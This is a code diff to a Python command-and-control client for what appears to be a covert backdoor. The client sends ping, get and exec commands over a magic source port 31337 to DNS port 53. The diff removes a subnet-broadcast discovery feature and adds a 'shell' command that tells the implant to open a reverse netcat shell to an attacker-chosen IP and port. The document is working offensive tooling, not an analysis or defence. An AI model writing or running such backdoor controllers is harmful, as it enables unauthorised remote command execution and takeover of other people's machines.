@@ -10,15 +10,14 @@ import time
 MAGIC_SRC_PORT = 31337
 DEFAULT_DEST_PORT = 53
 DEFAULT_LISTEN_PORT = 8080
-#DEFAULT_MULTICAST_IP = "239.255.255.250"
+DEFAULT_SHELL_PORT = 4444
 SOCKET_TIMEOUT = 15
-MAX_ROLLCALL_QUEUE = 64
 
 SUPPORTED_CMDS = [
     "ping",
-    "get",
     "exec",
-    "rollcall",
+    "get",
+    "shell",
 ]
 
 @contextlib.contextmanager
@@ -63,7 +62,7 @@ def _send_cmd(msg, ip, dest_port, listen_port):
     decoded = base64.b64decode(response)
     if decoded.startswith(b"ERROR"):
         errno = int(decoded.split(b"ERROR: ")[1])
-        raise RuntimeError(os.strerror(errno))
+        raise RuntimeError(f"{errno} ({os.strerror(errno)})")
     return decoded
 
 
@@ -107,41 +106,16 @@ def do_exec(ip, dest_port, listen_port, cmd, **kwargs):
     return errno, output
 
 
-def do_rollcall(subnets, dest_port, listen_port, expected, **kwargs):
-    """broadcast a PING and listen for responses"""
-    # we send: "8080;<b64>" --> netfilter adds IP: "172.18.123.1:8080;<b64>"
-    encoded = base64.b64encode("PING".encode("ascii"))
-    data = f"{listen_port};".encode("ascii") + encoded + b"\x00"
-    with _tcp_listener(listen_port, queue_size=expected) as tcp:
-        for cidr in subnets:
-            broadcast = str(ipaddress.IPv4Network(cidr, strict=False)[-1])
-            with _udp_sender() as udp:
-                udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-                print(f"sending magic packet (multicast) --> {broadcast}:{dest_port}")
-                udp.sendto(data, (broadcast, dest_port))
-        print("waiting for replies...")
-        try:
-            responses = []
-            while len(responses) < expected:
-                sock, hostaddr = tcp.accept()
-                ip, _ = hostaddr
-                response = sock.recv(64)
-                sock.close()
-                if "PONG" in base64.b64decode(response).decode("ascii"):
-                    print(f"Received PONG from {ip}")
-                    responses.append(ip)
-                else:
-                    print(f"Invalid response from: {ip}")
-        except socket.timeout:
-            pass
-    hosts = []
-    for ip in responses:
-        try:
-            hostname = socket.gethostbyaddr(ip)[0]
-        except socket.herror:
-            hostname = ip
-        hosts.append(hostname)
-    return hosts
+def do_shell(ip, dest_port, listen_port, shell, **kwargs):
+    """connect a reverse shell"""
+    # sanity check on host:IP string
+    assert len(shell.split(":")) == 2
+    assert int(shell.split(":")[1]) > 0
+    msg = f"SHELL {shell}"
+    response = _send_cmd(msg, ip, dest_port, listen_port).decode("ascii")
+    if "CONNECTED" not in response:
+        raise ValueError("Invalid response received!")
+    print(f"Connected reverse shell to {shell}")
 
 
 def main():
@@ -150,7 +124,7 @@ def main():
     subparsers = parser.add_subparsers(help="[supported commands]")
     parser.add_argument(
         "-i", "--ip",
-        default="127.0.0.1",
+        required=True,
         help="IP address of host machine",
     )
     parser.add_argument(
@@ -187,21 +161,13 @@ def main():
         help="command to run",
     )
     exec_parser.set_defaults(func=do_exec)
-    # rollcall
-    rollcall_parser = subparsers.add_parser("rollcall", help="multicast ping")
-    rollcall_parser.add_argument(
-        "-s", "--subnets",
-        required=True,
-        nargs="+",
-        help="CIDR-notated subnet(s) to multicast on, e.g. \"172.20.96.0/20)\"",
+    # shell
+    shell_parser = subparsers.add_parser("shell", help="start a reverse netcat shell")
+    shell_parser.add_argument(
+        "shell",
+        help="host listening for the TCP reverse shell (IP:port)",
     )
-    rollcall_parser.add_argument(
-        "-e", "--expected",
-        type=int,
-        default=MAX_ROLLCALL_QUEUE,
-        help="number of expected responses",
-    )
-    rollcall_parser.set_defaults(func=do_rollcall)
+    shell_parser.set_defaults(func=do_shell)
     # run with it
     args = parser.parse_args()
     args.func(**vars(args))
